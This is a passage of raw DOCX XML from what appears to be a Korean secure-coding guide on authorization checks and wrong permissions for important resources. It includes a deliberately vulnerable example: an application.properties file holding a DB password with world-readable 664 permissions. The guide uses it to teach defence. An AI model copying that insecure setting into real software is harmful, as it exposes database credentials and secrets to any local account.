            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public OrderDto getOrder(int orderId, HttpSession session) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    String userId = (String) session.getAttribute("userId");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    OrderDto order = orderDao.findById(orderId);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!userId.equals(order.getUserId())) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        throw new AccessDeniedException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return order;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>중요</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>자원에</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>잘못된</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>라이브러리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등은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SW </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자만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읽기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쓰기가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가능하도록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권한을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설정한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중요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자원을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사용하는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경우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허가받지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않은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사용자의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접근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가능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여부를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검사한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t># [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>읽기</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"># application.properties (DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>: -rw-rw-r-- (664)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"># </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>일반</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>사용자도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>내용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>열람</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">application.properties </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 664 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한이면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> OS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">·API </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>암호화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시크릿</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보유출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>타</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
